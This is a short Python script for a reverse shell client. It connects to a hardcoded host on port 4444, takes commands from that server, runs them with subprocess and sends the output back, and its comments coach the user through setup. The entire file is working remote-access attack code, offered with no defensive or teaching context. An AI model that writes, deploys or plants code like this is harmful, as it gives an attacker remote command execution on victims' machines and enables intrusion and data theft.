import socket
import subprocess

# Run ifconfig to see server's local address
SERVER_HOST_ADDR = "192.168.1.8"

# Bind your preferable port
SERVER_PORT = 4444

# Buffer size limit
BUFFER_SIZE = 1024

# Here we create a socket object
s = socket.socket()

# Connecting to server with connect() method
s.connect((SERVER_HOST_ADDR, SERVER_PORT))

while True:
    # Receiving commands from the server which are interpreted by cmd.exe in this case
    # Or you may want to spawn /bin/bash
    command = s.recv(BUFFER_SIZE).decode()

    # Breaking the loop and proceeding
    if command == 'exit' or command == 'Exit':
        break

    # Executing the received command and saving the results from the execution of the command
    output = subprocess.getoutput(command)

    # Sending the processed results to the server
    s.send(output.encode())

# Closing the socket connection
s.close()